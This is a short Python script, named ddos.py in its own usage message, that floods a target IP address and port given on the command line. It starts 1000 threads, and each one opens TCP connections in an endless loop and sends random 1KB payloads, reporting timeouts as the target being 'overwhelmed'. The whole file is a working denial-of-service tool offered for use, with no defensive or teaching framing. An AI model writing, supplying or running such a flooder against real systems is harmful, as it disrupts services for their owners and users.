import socket
import sys
import threading
import random
import string

def generate_payload(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

def attack(target_ip, port):
    while True:
        try:
            socket.setdefaulttimeout(1)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, port))
            payload = generate_payload(1024)  # Generate a 1KB payload
            s.send(payload.encode())
            print(f"Sent {len(payload)} bytes to {target_ip} on port {port}")
        except socket.timeout:
            print(f"Target {target_ip} timed out - likely overwhelmed")
        except socket.error as e:
            print(f"Error: {e}")
        finally:
            s.close()

def main():
    if len(sys.argv) != 3:
        print("Usage: python ddos.py <target_ip> <port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    port = int(sys.argv[2])

    threads = []

    for _ in range(1000):
        thread = threading.Thread(target=attack, args=(target_ip, port))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
